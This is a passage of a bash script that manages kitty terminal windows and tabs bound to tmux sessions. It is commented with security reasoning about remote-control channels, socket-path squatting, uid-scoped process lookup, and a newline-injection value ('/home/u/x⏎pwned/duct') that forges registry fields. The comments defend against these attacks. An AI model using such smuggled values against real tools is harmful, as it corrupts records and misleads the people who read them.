      if ! flock 9; then
        echo "💥 term.open: could not lock terminal '$duct'" >&2
        return 1
      fi

      # re-verify the terminal still exists (it may have been stopped between the
      # unlocked lookup and here); an empty socket means the record is gone
      local host_socket
      host_socket=$(__term_get_socket "$host_pid")
      if [[ -z "$host_socket" ]]; then
        echo "✋ term.open: terminal '$duct' stopped before the tab could be added" >&2
        return 2
      fi

      # remote terminals: tabs are local-only in v1 (fail loud on a corrupt read
      # rather than treat an unreadable host as local — a friction hazard)
      local host_remote
      if ! host_remote=$(__term_get_host "$host_pid"); then
        echo "💥 term.open: could not read terminal '$duct' (corrupt registry?)" >&2
        return 1
      fi
      if [[ -n "$host_remote" ]]; then
        echo "✋ term.open: tabs not supported for remote terminals in v1" >&2
        return 2
      fi

      # findsert: focus an extant live tab (no dup); heal a truly stale entry
      __term_has_tab "$host_pid" "$tab"
      local has_rc=$?
      if [[ $has_rc -eq 2 ]]; then
        # unreadable record — __term_has_tab already reported it (malfunction)
        return 1
      fi
      if [[ $has_rc -eq 0 ]]; then
        local match
        if ! match=$(__term_tab_match "$host_pid" "$tab"); then
          echo "💥 term.open: could not derive match for tab '$tab' (corrupt registry?)" >&2
          return 1
        fi
        if __term_focus_tab "$host_socket" "$match"; then
          echo "🖥️  term://$duct tab '$tab' found (in pid $host_pid)"
          return 0
        fi
        # focus failed — probe before we heal: a still-present window means a
        # transient failure (fail loud, never dup); an absent one is stale (heal)
        if __term_probe_tab "$host_socket" "$match"; then
          echo "💥 term.open: tab '$tab' exists but could not be focused (transient error?)" >&2
          return 1
        fi
        # heal the stale entry; fail loud if the registry write itself fails,
        # so we never launch a fresh tab over an inconsistent record
        if ! __term_unregister_tab "$host_pid" "$tab"; then
          echo "💥 term.open: could not heal stale tab '$tab' entry (registry write failed)" >&2
          return 1
        fi
      fi

      # the tab attaches the tmux session named by --duct (default: the slug — so
      # title==session stays today's behavior). the title stays the clean slug even
      # when the session is a longer unique name.
      local tab_session="${tab_duct:-$tab}"

      # guard: a tab attaches a local tmux session; if it is absent the shell exits
      # and the tab dies instantly. fail clear before we spawn (matches base-open).
      if ! __term_has_tmux_session "$tab_session"; then
        echo "✋ term.open: no tmux session '$tab_session' — create it first (tmux new-session -d -s '$tab_session')" >&2
        return 2
      fi

      # wait for the listen socket to answer before we drive it — when a terminal
      # was opened moments ago its kitty socket may not yet be ready, so a tab
      # launch that fires too soon leaks a raw "connect: no such file" error and
      # fails. mirror base-open: await the socket, fail loud if it never answers.
      if ! __term_await_socket "$host_socket"; then
        echo "💥 term.open: terminal '$duct' socket never answered for tab '$tab'" >&2
        return 1
      fi

      # launch the tab; capture the new kitty window id printed on stdout (robust handle)
      local tab_id
      if ! tab_id=$(__term_launch_tab "$host_socket" "$tab" "$cwd" "$shell" "$tab_session"); then
        echo "💥 term.open: failed to open tab '$tab' in terminal '$duct'" >&2
        return 1
      fi

      # store the id only if launch printed a clean integer, else null (title match)
      local kitty_id="null"
      __term_is_kitty_id "$tab_id" && kitty_id="$tab_id"

      if ! __term_register_tab "$host_pid" "$tab" "$kitty_id"; then
        echo "💥 term.open: tab '$tab' launched but could not be registered" >&2
        return 1
      fi
      echo "🖥️  term://$duct tab '$tab' opened (in pid $host_pid)"
      return 0
    } 9>"$lockpath"
    fi
  fi

  # if --pid given, focus that terminal
  if [[ -n "$pid" ]]; then
    local socket
    socket=$(__term_get_socket "$pid")
    if [[ -z "$socket" ]]; then
      echo "✋ term.open: terminal $pid not found" >&2
      return 2
    fi
    if ! __term_focus_base "$socket"; then
      echo "💥 term.open: failed to focus $pid" >&2
      return 1
    fi
    echo "🖥️  term $pid focused"
    return 0
  fi

  # default cwd to current directory
  cwd="${cwd:-$(pwd)}"

  # if duct specified, check for extant terminal
  if [[ -n "$duct" ]]; then
    local extant_pid
    extant_pid=$(__term_find_by_duct "$duct")
    if [[ -n "$extant_pid" ]]; then
      echo "🖥️  term://$duct found (pid $extant_pid)"
      # propagate the focus exit — a stale socket / dead window must not be
      # reported as a successful open (same fail-loud contract as the tab paths)
      term.open --via kitty --pid "$extant_pid"
      return $?
    fi
  fi

  # parse duct slug for remote support
  local duct_host=""
  local duct_session=""
  if [[ -n "$duct" ]]; then
    __term_parse_duct_slug "$duct"
    duct_host="$TERM_HOST"
    duct_session="$TERM_SESSION"
  fi

  # the base tab's attached session: a --tab/--for on this first open (base_label
  # set) attaches the tab's own duct (e.g. slug/role for --for), while the terminal's
  # identity stays duct_session (the --on value) — so a later --on <slug> still finds
  # it. absent base_label, the base attaches the terminal's own duct (today).
  local base_attach="$duct_session"
  if [[ -n "$base_label" ]]; then
    # a fresh --tab/--for base is local-only (its duct is a local session)
    if [[ -n "$duct_host" ]]; then
      echo "✋ term.open: --tab/--for on a fresh terminal is local-only in v1 (no remote '$duct')" >&2
      return 2
    fi
    base_attach="${tab_duct:-$tab}"
  fi

  # guard: a local duct attaches to a tmux session; if that session is absent the
  # attach fails, the shell exits, and the kitty dies within ~0.3s (leaving no
  # window and a confusing dead-socket error). fail clear before we spawn.
  if [[ -n "$duct" && -z "$duct_host" ]]; then
    if ! __term_has_tmux_session "$base_attach"; then
      echo "✋ term.open: no tmux session '$base_attach' — create it first (tmux new-session -d -s '$base_attach')" >&2
      return 2
    fi
  fi

  # spawn kitty with remote control
  # use {kitty_pid} placeholder - kitty expands this to its actual PID
  #
  # 🛑 .why socket-only, and NEVER yes
  #    kitty accepts remote control over TWO channels: the unix socket, and the
  #    TTY — that is, the escape-sequence stream its child writes. `yes` opens
  #    both, and kitty's own manual names the consequence:
  #
  #      > other programs can control all aspects of kitty, including sending
  #      > text to kitty windows, opening new windows, closing windows, reading
  #      > the content of windows. Note that this even works over SSH connections.
  #
  #    the child of the first branch below is `ssh -t <grove>`. so under `yes`,
  #    any byte the GROVE writes to stdout may carry a `launch` command, and
  #    kitty runs it HERE — on the laptop that holds the keyrack and the ssh
  #    keys the grove sits behind. the trust direction inverts.
  #
  #    `socket-only` accepts the socket unconditionally and DENIES the TTY. its
  #    cost here is zero: every `kitten @` call in this file passes
  #    `--to "$socket"`, so not one uses the TTY channel.
  #
  #    ✔ measured 2026-08-31 — `rhx termwork.test live` drives real kitty + tmux
  #      under socket-only and goes 20/20: `ls` reads the tab bar, `send-text`
  #      reaches a tab, `get-text` reads it back, `close-window` drops one. run
  #      that before you widen this value.
  #
  #    ⚠️ `socket` is the weaker sibling — it confirms a TTY request by password
  #       rather than refusing it, so it keeps the channel open and adds a secret
  #       to manage. the channel this repo does not use is the channel this repo
  #       should not hold (`rule.require.narrowest-terminal-grant`).
  ####################################################################
  # 🛑 THE SOCKET IS THE GRANT — so its PATH is part of the grant
  #
  # the block above reasons about WHICH CHANNEL kitty accepts, and refuses the
  # TTY one. it says none about where the channel it DOES accept lives, and a
  # `/tmp/kitty-{kitty_pid}` is a predictable name in a 1777 dir. a socket-only
  # grant on a world-writable path is not narrow:
  #
  #   whoever binds `/tmp/kitty-<pid>` FIRST owns that address. `__term_send_text`
  #   then types into their socket and `__term_get_text` reads their answer, so
  #   a squatter both receives what this human sends and dictates what this
  #   human reads back — over the very channel `socket-only` exists to make the
  #   only one (`rule.require.narrowest-terminal-grant`).
  #
  # ⇒ `$XDG_RUNTIME_DIR` is `/run/user/<uid>`, mode 0700, per-user, on tmpfs.
  #   another uid cannot pre-bind a path inside it, so the squat is gone as a
  #   CLASS rather than raced against (`rule.require.solve-at-cause`).
  #
  # ⚠️ the fallback is a mktemp'd 0700 dir, never a bare /tmp path. a box with
  #    no systemd user session has no XDG_RUNTIME_DIR, and to fall back to the
  #    defective path would restore the whole defect on exactly the boxes least
  #    likely to be watched.
  ####################################################################
  if [[ -z "${TERMWORK_SOCKET_DIR:-}" || ! -d "${TERMWORK_SOCKET_DIR:-}" ]]; then
    if [[ -n "${XDG_RUNTIME_DIR:-}" && -d "${XDG_RUNTIME_DIR}" ]]; then
      TERMWORK_SOCKET_DIR="$XDG_RUNTIME_DIR/termwork"
      mkdir -p "$TERMWORK_SOCKET_DIR" && chmod 700 "$TERMWORK_SOCKET_DIR"
    else
      TERMWORK_SOCKET_DIR="$(mktemp -d "${TMPDIR:-/tmp}/termwork.XXXXXXXX")" || {
        echo "💥 term.open: could not make a private dir for the control socket" >&2
        return 1
      }
      chmod 700 "$TERMWORK_SOCKET_DIR"
    fi
  fi
  local sock_tpl="unix:$TERMWORK_SOCKET_DIR/kitty-{kitty_pid}"

  # ⚠️ both branches hand a command STRING to a shell, so the session name is
  #    carried as base64 rather than interpolated; and the remote branch's host
  #    is grammar-clamped before ssh reads it as a positional. see
  #    __term_as_attach_command and __term_as_ssh_host for what each closes.
  local base_attach_cmd
  base_attach_cmd="$(__term_as_attach_command "$base_attach")" || return $?

  if [[ -n "$duct" ]]; then
    if [[ -n "$duct_host" ]]; then
      # remote duct: ssh to host and attach to tmux session
      local ssh_host duct_attach_cmd
      ssh_host="$(__term_as_ssh_host "$duct_host")" || return $?
      duct_attach_cmd="$(__term_as_attach_command "$duct_session")" || return $?
      kitty \
        -o "allow_remote_control=socket-only" \
        -o "listen_on=$sock_tpl" \
        --detach \
        --directory "$cwd" \
        -e ssh -t "$ssh_host" "$duct_attach_cmd"
    else
      # local duct: attach to tmux session via interactive login shell
      kitty \
        -o "allow_remote_control=socket-only" \
        -o "listen_on=$sock_tpl" \
        --detach \
        --directory "$cwd" \
        -e "$shell" -l -i -c "$base_attach_cmd"
    fi
  else
    kitty \
      -o "allow_remote_control=socket-only" \
      -o "listen_on=$sock_tpl" \
      --detach \
      --directory "$cwd" \
      -e "$shell"
  fi

  ####################################################################
  # find the kitty process we just spawned (most recent kitty by start time)
  #
  # ⚠️ `-u "$(id -u)"` — a bare `pgrep -n kitty` returns the newest match on the
  #    BOX, any uid. so another human's kitty, started inside this 0.3s window,
  #    became the pid this function registered and every later `term.send` typed
  #    into. the scope is the fix; the window itself is inherent to a `--detach`
  #    spawn that returns no pid.
  ####################################################################
  sleep 0.3
  local pid
  pid=$(pgrep -n -u "$(id -u)" kitty)
  if [[ -z "$pid" ]]; then
    echo "💥 term.open: failed to find kitty process" >&2
    return 1
  fi

  # register terminal with file socket path
  local socket="unix:$TERMWORK_SOCKET_DIR/kitty-$pid"
  __term_register "$pid" "$socket" "$cwd" "$duct_session" "$duct_host"

  # wait for the listen socket to answer before we drive it — a fresh kitty
  # creates the socket asynchronously; without this the base-tab calls below can
  # fire against a not-ready socket and leak a raw "connect: no such file" error
  if ! __term_await_socket "$socket"; then
    echo "💥 term.open: terminal $pid spawned but its socket never came up" >&2
    return 1
  fi

  # give the base (first) tab an explicit title so the tab bar shows a short
  # label ("main" by default) instead of the shell's repo:branch window title —
  # the two are separate: the window title (OSC-2, titlebar) stays repo:branch,
  # this only names the tab. register it so it shows in term.list and is
  # addressable as --tab <label>. precedence: an explicit --tab on this first open
  # (base_label) wins, else TERMWORK_BASE_TAB, else 'main'.
  local base_tab="${base_label:-${TERMWORK_BASE_TAB:-main}}"
  __term_set_tab_title "$socket" "$base_tab"
  local base_id
  base_id=$(__term_get_base_window_id "$socket")
  __term_is_kitty_id "$base_id" || base_id="null"
  __term_register_tab "$pid" "$base_tab" "$base_id"

  if [[ -n "$duct" ]]; then
    if [[ -n "$duct_host" ]]; then
      echo "🖥️  term://$duct opened (pid $pid, cloud)"
    else
      echo "🖥️  term://$duct opened (pid $pid, local)"
    fi
  else
    echo "🖥️  term://shell opened (pid $pid)"
  fi
}

term.stop() {
  local via=""
  local pid=""
  local duct=""
  local tab=""
  local role=""

  while [[ $# -gt 0 ]]; do
    case "$1" in
      --via) via="$2"; shift 2 ;;
      --pid) pid="$2"; shift 2 ;;
      --on) duct="$2"; shift 2 ;;
      --tab) tab="$2"; shift 2 ;;
      --for) role="$2"; shift 2 ;;
      --help|-h) __term_usage term.stop; return 0 ;;
      *) echo "✋ term.stop: unknown arg '$1'" >&2; return 2 ;;
    esac
  done

  if [[ -z "$via" ]]; then
    echo "✋ term.stop: --via required" >&2
    return 2
  fi

  if [[ "$via" != "kitty" ]]; then
    echo "✋ term.stop: unknown terminal '$via'" >&2
    return 2
  fi

  # --for <role> addresses the role's tab (titled <role>); shorthand for --tab <role>
  if [[ -n "$role" ]]; then
    if [[ -z "$duct" ]]; then
      echo "✋ term.stop: --for requires --on <terminal>" >&2
      return 2
    fi
    if [[ -n "$tab" ]]; then
      echo "✋ term.stop: --for is shorthand for --tab; do not combine them" >&2
      return 2
    fi
    tab="$role"
  fi

  # --tab addresses a tab within a terminal; --pid names a terminal
  if [[ -n "$tab" && -n "$pid" ]]; then
    echo "✋ term.stop: --pid addresses a terminal; use --on <terminal> --tab <slug> for a tab" >&2
    return 2
  fi

  # a tab lives inside a named terminal, so --tab needs --on to name it
  if [[ -n "$tab" && -z "$duct" ]]; then
    echo "✋ term.stop: --tab requires --on <terminal>" >&2
    return 2
  fi

  # lookup pid from duct name
  if [[ -n "$duct" && -z "$pid" ]]; then
    pid=$(__term_find_by_duct "$duct")
    if [[ -z "$pid" ]]; then
      # keep the tab in the message so a supervisor sees which target was meant
      local for_tab=""
      [[ -n "$tab" ]] && for_tab=" (needed for --tab '$tab')"
      echo "✋ term.stop: no terminal for duct '$duct'$for_tab" >&2
      return 2
    fi
  fi

  if [[ -z "$pid" ]]; then
    echo "✋ term.stop: --pid or --on required" >&2
    return 2
  fi

  local socket
  socket=$(__term_get_socket "$pid")
  if [[ -z "$socket" ]]; then
    echo "✋ term.stop: terminal $pid not found" >&2
    return 2
  fi

  # --tab <slug>: close only that tab; the terminal and other tabs survive.
  # serialize the check+close+unregister under the per-terminal lock (keyed by
  # pid) so a concurrent term.open/term.stop of the same terminal cannot
  # interleave registry writes. the brace group holds fd 9; return unlocks.
  if [[ -n "$tab" ]]; then
    local lockpath
    lockpath=$(__term_lock_path "$pid")
    {
      if ! flock 9; then
        echo "💥 term.stop: could not lock terminal '$duct'" >&2
        return 1
      fi

      __term_require_tab "$pid" "$tab" "$duct" "term.stop" || return $?
      local match
      if ! match=$(__term_tab_match "$pid" "$tab"); then
        echo "💥 term.stop: could not derive match for tab '$tab' (corrupt registry?)" >&2
        return 1
      fi
      # if close-window fails the window was already gone; drop the entry and say so
      # truthfully rather than claim "stopped" (fail clear / succeed completely)
      if ! __term_close_window_matched "$socket" "$match"; then
        if ! __term_unregister_tab "$pid" "$tab"; then
          echo "💥 term.stop: tab '$tab' window gone but its entry could not be dropped" >&2
          return 1
        fi
        echo "🖥️  term://$duct tab '$tab' was already gone (unregistered)"
        return 0
      fi
      if ! __term_unregister_tab "$pid" "$tab"; then
        echo "💥 term.stop: tab '$tab' closed but its entry could not be dropped" >&2
        return 1
      fi

      # that close may have taken the terminal's last window down — kitty exits an
      # os window when its final tab closes, so the instance is now gone. detect
      # that (dead pid) and drop the whole record, else a stale entry lingers.
      # the base tab keeps the pid alive, so this fires only on a true last-tab
      # close (honors the vision's "last tab → close terminal").
      if ! kill -0 "$pid" 2>/dev/null; then
        __term_unregister "$pid"
        echo "🖥️  term://$duct tab '$tab' stopped (last tab — terminal closed)"
        return 0
      fi
      echo "🖥️  term://$duct tab '$tab' stopped"
      return 0
    } 9>"$lockpath"
  fi

  # no --tab: close the whole terminal — every terminal is its own kitty
  # instance (one socket), so close each registered tab window, then the base
  # window; the instance exits when its last window closes. with zero tabs this
  # is exactly today's single `close-window` path (backward compatible).
  # held under the same per-terminal lock so a concurrent tab op cannot register
  # or close a tab mid-teardown (behavior hazard: a lost tab or a double close).
  local lockpath
  lockpath=$(__term_lock_path "$pid")
  {
    if ! flock 9; then
      echo "💥 term.stop: could not lock terminal '$pid'" >&2
      return 1
    fi

    # read the tab slugs up front so an unreadable registry fails loud here,
    # rather than a process-substitution that swallows the non-zero exit (failhide)
    local slugs
    if ! slugs=$(__term_list_tab_slugs "$pid"); then
      echo "💥 term.stop: could not read tabs for terminal '$pid' (corrupt registry?)" >&2
      return 1
    fi

    # shut every registered tab window — this now includes the base 'main' tab,
    # so once all are shut the instance exits. a tab window already gone is an
    # expected teardown case (continue), but surface the failure on stderr (fail
    # loud). match by the robust selector (stored id, else title). feed the loop
    # via process substitution on printf — no here-string, which leaks in zsh.
    local slug match
    while IFS= read -r slug; do
      [[ -n "$slug" ]] || continue
      if ! match=$(__term_tab_match "$pid" "$slug"); then
        echo "⚠️  term.stop: could not derive match for tab '$slug' (corrupt registry?)" >&2
        continue
      fi
      if ! __term_close_window_matched "$socket" "$match"; then
        echo "⚠️  term.stop: could not close tab window '$slug' (already gone?)" >&2
      fi
    done < <(printf '%s\n' "$slugs")

    # if the instance is gone (its last window just shut), the teardown is done
    if ! kill -0 "$pid" 2>/dev/null; then
      __term_unregister "$pid"
      echo "🖥️  term $pid stopped"
      return 0
    fi

    # still alive — either an older record with no tabs registered, or a window
    # that would not shut. shut the base window as a fallback; a live instance
    # that still refuses is a real malfunction (fail loud).
    if ! __term_close_window_base "$socket"; then
      if kill -0 "$pid" 2>/dev/null; then
        echo "💥 term.stop: terminal $pid is alive but its window would not close" >&2
        return 1
      fi
      __term_unregister "$pid"
      echo "🖥️  term $pid stopped"
      return 0
    fi

    __term_unregister "$pid"
    echo "🖥️  term $pid stopped"
    return 0
  } 9>"$lockpath"
}

term.read() {
  local via=""
  local pid=""
  local duct=""
  local tab=""
  local role=""

  while [[ $# -gt 0 ]]; do
    case "$1" in
      --via) via="$2"; shift 2 ;;
      --pid) pid="$2"; shift 2 ;;
      --on) duct="$2"; shift 2 ;;
      --tab) tab="$2"; shift 2 ;;
      --for) role="$2"; shift 2 ;;
      --help|-h) __term_usage term.read; return 0 ;;
      *) echo "✋ term.read: unknown arg '$1'" >&2; return 2 ;;
    esac
  done

  if [[ -z "$via" ]]; then
    echo "✋ term.read: --via required" >&2
    return 2
  fi

  if [[ "$via" != "kitty" ]]; then
    echo "✋ term.read: unknown terminal '$via'" >&2
    return 2
  fi

  # --for <role> addresses the role's tab (titled <role>); shorthand for --tab <role>
  if [[ -n "$role" ]]; then
    if [[ -z "$duct" ]]; then
      echo "✋ term.read: --for requires --on <terminal>" >&2
      return 2
    fi
    if [[ -n "$tab" ]]; then
      echo "✋ term.read: --for is shorthand for --tab; do not combine them" >&2
      return 2
    fi
    tab="$role"
  fi

  # --tab addresses a tab within a terminal; --pid names a terminal
  if [[ -n "$tab" && -n "$pid" ]]; then
    echo "✋ term.read: --pid addresses a terminal; use --on <terminal> --tab <slug> for a tab" >&2
    return 2
  fi

  # a tab lives inside a named terminal, so --tab needs --on to name it
  if [[ -n "$tab" && -z "$duct" ]]; then
    echo "✋ term.read: --tab requires --on <terminal>" >&2
    return 2
  fi

  # lookup pid from duct name
  if [[ -n "$duct" && -z "$pid" ]]; then
    pid=$(__term_find_by_duct "$duct")
    if [[ -z "$pid" ]]; then
      # keep the tab in the message so a supervisor sees which target was meant
      local for_tab=""
      [[ -n "$tab" ]] && for_tab=" (needed for --tab '$tab')"
      echo "✋ term.read: no terminal for duct '$duct'$for_tab" >&2
      return 2
    fi
  fi

  if [[ -z "$pid" ]]; then
    echo "✋ term.read: --pid or --on required" >&2
    return 2
  fi

  local socket
  socket=$(__term_get_socket "$pid")
  if [[ -z "$socket" ]]; then
    echo "✋ term.read: terminal $pid not found" >&2
    return 2
  fi

  # --tab <slug>: read only that tab's window. hold the per-terminal lock across
  # the check→read so a concurrent term.stop --tab cannot close+unregister the
  # tab between the guard and the get-text (TOCTOU race on shared state).
  if [[ -n "$tab" ]]; then
    local lockpath
    lockpath=$(__term_lock_path "$pid")
    {
      if ! flock 9; then
        echo "💥 term.read: could not lock terminal '$duct'" >&2
        return 1
      fi
      __term_require_tab "$pid" "$tab" "$duct" "term.read" || return $?
      local match
      if ! match=$(__term_tab_match "$pid" "$tab"); then
        echo "💥 term.read: could not derive match for tab '$tab' (corrupt registry?)" >&2
        return 1
      fi
      if ! __term_get_text "$socket" "$match"; then
        echo "💥 term.read: failed to read tab '$tab' in terminal '$duct' (stale window?)" >&2
        return 1
      fi
      return 0
    } 9>"$lockpath"
  fi

  # no --tab: read the terminal's base window; fail loud on a stale socket
  if ! __term_get_text_base "$socket"; then
    echo "💥 term.read: failed to read terminal '$pid' (stale socket?)" >&2
    return 1
  fi
}

term.send() {
  local via=""
  local pid=""
  local duct=""
  local what=""
  local tab=""
  local role=""

  while [[ $# -gt 0 ]]; do
    case "$1" in
      --via) via="$2"; shift 2 ;;
      --pid) pid="$2"; shift 2 ;;
      --on) duct="$2"; shift 2 ;;
      --what) what="$2"; shift 2 ;;
      --tab) tab="$2"; shift 2 ;;
      --for) role="$2"; shift 2 ;;
      --help|-h) __term_usage term.send; return 0 ;;
      *) echo "✋ term.send: unknown arg '$1'" >&2; return 2 ;;
    esac
  done

  if [[ -z "$via" ]]; then
    echo "✋ term.send: --via required" >&2
    return 2
  fi

  if [[ "$via" != "kitty" ]]; then
    echo "✋ term.send: unknown terminal '$via'" >&2
    return 2
  fi

  # --for <role> addresses the role's tab (titled <role>); shorthand for --tab <role>
  if [[ -n "$role" ]]; then
    if [[ -z "$duct" ]]; then
      echo "✋ term.send: --for requires --on <terminal>" >&2
      return 2
    fi
    if [[ -n "$tab" ]]; then
      echo "✋ term.send: --for is shorthand for --tab; do not combine them" >&2
      return 2
    fi
    tab="$role"
  fi

  # --tab addresses a tab within a terminal; --pid names a terminal
  if [[ -n "$tab" && -n "$pid" ]]; then
    echo "✋ term.send: --pid addresses a terminal; use --on <terminal> --tab <slug> for a tab" >&2
    return 2
  fi

  # a tab lives inside a named terminal, so --tab needs --on to name it
  if [[ -n "$tab" && -z "$duct" ]]; then
    echo "✋ term.send: --tab requires --on <terminal>" >&2
    return 2
  fi

  # lookup pid from duct name
  if [[ -n "$duct" && -z "$pid" ]]; then
    pid=$(__term_find_by_duct "$duct")
    if [[ -z "$pid" ]]; then
      # keep the tab in the message so a supervisor sees which target was meant
      local for_tab=""
      [[ -n "$tab" ]] && for_tab=" (needed for --tab '$tab')"
      echo "✋ term.send: no terminal for duct '$duct'$for_tab" >&2
      return 2
    fi
  fi

  if [[ -z "$pid" ]]; then
    echo "✋ term.send: --pid or --on required" >&2
    return 2
  fi

  if [[ -z "$what" ]]; then
    echo "✋ term.send: --what required" >&2
    return 2
  fi

  local socket
  socket=$(__term_get_socket "$pid")
  if [[ -z "$socket" ]]; then
    echo "✋ term.send: terminal $pid not found" >&2
    return 2
  fi

  # --tab <slug>: send only to that tab's window. hold the per-terminal lock
  # across the check→send so a concurrent term.stop --tab cannot close+unregister
  # the tab between the guard and the send-text (TOCTOU race on shared state).
  if [[ -n "$tab" ]]; then
    local lockpath
    lockpath=$(__term_lock_path "$pid")
    {
      if ! flock 9; then
        echo "💥 term.send: could not lock terminal '$duct'" >&2
        return 1
      fi
      __term_require_tab "$pid" "$tab" "$duct" "term.send" || return $?
      local match
      if ! match=$(__term_tab_match "$pid" "$tab"); then
        echo "💥 term.send: could not derive match for tab '$tab' (corrupt registry?)" >&2
        return 1
      fi
      if ! __term_send_text "$socket" "$match" "$what"; then
        echo "💥 term.send: failed to send to tab '$tab' in terminal '$duct' (stale window?)" >&2
        return 1
      fi
      return 0
    } 9>"$lockpath"
  fi

  # no --tab: send to the terminal's base window; fail loud on a stale socket
  if ! __term_send_text_base "$socket" "$what"; then
    echo "💥 term.send: failed to send to terminal '$pid' (stale socket?)" >&2
    return 1
  fi
}

# .what = print a terminal's tabs as an indented tree branch (│ ├─ / │ └─)
# .why  = keeps term.list declarative — the count/glyph render detail lives here,
#         not inline in the orchestrator; the final tab closes with └─
__term_print_tab_tree() {
  local pid="$1"
  local slugs
  if ! slugs=$(__term_list_tab_slugs "$pid"); then
    echo "💥 __term_print_tab_tree: failed to read tabs for pid $pid" >&2
    return 1
  fi
  [[ -n "$slugs" ]] || return 0

  echo "   ├─ tabs"
  local total seen slug glyph
  # count non-empty lines via process substitution (no here-string, which leaks
  # a `var=$'...'` line in zsh); grep -c . counts the tab slugs
  total=$(printf '%s\n' "$slugs" | grep -c .)
  seen=0
  while IFS= read -r slug; do
    [[ -n "$slug" ]] || continue
    seen=$((seen + 1))
    glyph="├─"
    [[ $seen -eq $total ]] && glyph="└─"
    echo "   │  $glyph $slug"
  done < <(printf '%s\n' "$slugs")
}

term.list() {
  local via=""

  while [[ $# -gt 0 ]]; do
    case "$1" in
      --via) via="$2"; shift 2 ;;
      --help|-h) __term_usage term.list; return 0 ;;
      *) echo "✋ term.list: unknown arg '$1'" >&2; return 2 ;;
    esac
  done

  if [[ -z "$via" ]]; then
    echo "✋ term.list: --via required" >&2
    return 2
  fi

  if [[ "$via" != "kitty" ]]; then
    echo "✋ term.list: unknown terminal '$via'" >&2
    return 2
  fi

  __term_ensure_dir

  local found=0
  local f pid cwd duct host started socket ts slug

  while IFS= read -r -d '' f; do
    [[ -f "$f" ]] || continue

    # validate the record is readable json; a corrupt one fails loud and skips
    if ! jq -e . "$f" >/dev/null 2>&1; then
      echo "⚠️  term.list: skipped unreadable record $f (corrupt?)" >&2
      continue
    fi
    ##################################################################
    # 🛑 ONE record, ONE line — the fields are bounded by TAB, never by
    #    NEWLINE. measured 2026-09-01
    #
    #    `__term_register` (this file, above) declares `cwd`, `duct`, and
    #    `host` ATTACKER-SHAPED and hardens the WRITE with `jq --arg`, because
    #    a linux directory may hold any byte but `/` and NUL. this READ undid
    #    that: `jq -r '.pid, .cwd, …'` emits one LINE PER VALUE, so a value
    #    that carries a newline emits TWO lines and every later field shifts.
    #
    #    six positional reads over seven lines, with `cwd` = `/home/u/x⏎pwned/duct`:
    #
    #      field    read as              truth
    #      ------   ------------------   ------------------
    #      duct     pwned/duct           main/mechanic
    #      host     main/mechanic        grove-1
    #      started  grove-1              1700000000000
    #      socket   1700000000000        /run/s
    #
    #    ⇒ the printed address becomes `term://main/mechanic:pwned/duct` — a
    #      duct nobody opened, on a host nobody named, composed out of a
    #      DIRECTORY NAME. and `socket` never holds a socket at all.
    #
    #    `@tsv` escapes a tab, newline, and carriage return INSIDE a field to
    #    the two characters `\t`/`\n`/`\r`, so a field can neither end itself
    #    nor forge a row. one record is one line, for every value jq can emit.
    #
    # ⚠️ .the BOUND `@tsv` buys: it also escapes `\` as `\\`, so a cwd that
    #    holds a literal backslash DISPLAYS doubled. that is a cosmetic cost on
    #    a hostile value and the safe direction — the alternative is a second
    #    reader for `cwd` alone, which is one record with two readers free to
    #    drift (`gotcha.a-check-that-cries-wolf-gets-silenced`, m.9).
    #
    # ⚠️ .and it is NOT an escape strip: `@tsv` leaves ESC (0x1b) alone.
    #    whatever this loop echoes still needs `__duct_strip_escapes`.
    #
    # .why a here-string is safe HERE
    #    the trap is a here-string fed to a BRACE GROUP, which leaks a
    #    `record=$'…'` line under zsh. this is one plain `read`, the form
    #    `5.15.identity/_.sh` already uses in both dialects. no array subscript
    #    is taken, so the 0-vs-1 base split does not arise either.
    ##################################################################
    local record
    record="$(jq -r '[.pid, .cwd, (.duct // ""), (.host // ""), .startedAt, .socket] | @tsv' "$f")"
    IFS=$'\t' read -r pid cwd duct host started socket <<< "$record"

    # 🛑 the three ATTACKER-SHAPED fields are sunk ONCE, here — never at each
    #    print. `slug` is composed from `host` and `duct` below, so a sink at
    #    the print sites would have to cover four places and could miss one
    #    (`rule.require.solve-at-cause`). `pid` is `--argjson`, so jq refuses a
    #    non-number; `startedAt` is this box's own clock.
    cwd="$(__term_sink "$cwd")"
    duct="$(__term_sink "$duct")"
    host="$(__term_sink "$host")"

    # check if process still alive
    if ! kill -0 "$pid" 2>/dev/null; then
      rm -f "$f"
      continue
    fi

    found=1
    # only do epoch math when startedAt is all digits, else show it raw — a
    # defensive guard so a malformed value can never throw a bad-math error again
    if [[ "$started" =~ ^[0-9]+$ ]]; then
      ts=$(date -d "@$((started / 1000))" "+%Y-%m-%d %H:%M" 2>/dev/null || echo "$started")
    else
      ts="$started"
    fi

    # reconstruct full slug for display
    if [[ -n "$host" ]]; then
      slug="$host:$duct"
    else
      slug="$duct"
    fi

    ##################################################################
    # 🛑 every line that carries a RECORD VALUE uses `printf`, never `echo`
    #    — measured 2026-09-01, and only zsh showed it
    #
    #    the `@tsv` read above hands `cwd` over with its newline already
    #    escaped to the two characters `\n`. bash's `echo` prints those two
    #    characters. ZSH'S BUILTIN `echo` EXPANDS THEM, so the escape is undone
    #    at the last step and the value forges an output row again:
    #
    #      bash │    ├─ cwd: /home/u/x\npwned/duct     ← one line, one row
    #      zsh  │    ├─ cwd: /home/u/x                 ← two lines, and the
    #           │ pwned/duct                             second reads as a row
    #
    #    ⇒ the frame held in BOTH dialects — the printed address is
    #      `term://grove-1:main/mechanic` either way. what differed is the
    #      DISPLAY, so a fix measured only under bash would have shipped the
    #      forgery to every zsh user under a green probe.
    #
    #    `printf '%s\n'` expands no escape in either dialect. the literal parts
    #    keep `echo`, because a literal carries no record value.
    #
    # ⚠️ this is NOT an escape strip either. `@tsv` leaves ESC (0x1b) alone, so
    #    a cwd that carries a terminal escape still reaches the terminal raw.
    #    that is a separate claim, against a separate tool
    #    (`__duct_strip_escapes`).
    ##################################################################
    echo ""
    if [[ -n "$duct" ]]; then
      printf '🖥️  term://%s\n' "$slug"
    else
      echo "🖥️  term://shell"
    fi
    printf '   ├─ pid: %s\n' "$pid"
    printf '   ├─ cwd: %s\n' "$cwd"
    if [[ -n "$duct" ]]; then
      printf '   ├─ duct: %s\n' "$slug"
      if [[ -n "$host" ]]; then
        printf '   ├─ host: %s (cloud)\n' "$host"
      else
        echo "   ├─ host: localhost (local)"
      fi
    fi

    # nest any tabs as a branch, then close with `opened:` as the final leaf so a
    # caller that parses the tree sees the same last line whether or not tabs exist
    __term_print_tab_tree "$pid"
    echo "   └─ opened: $ts"
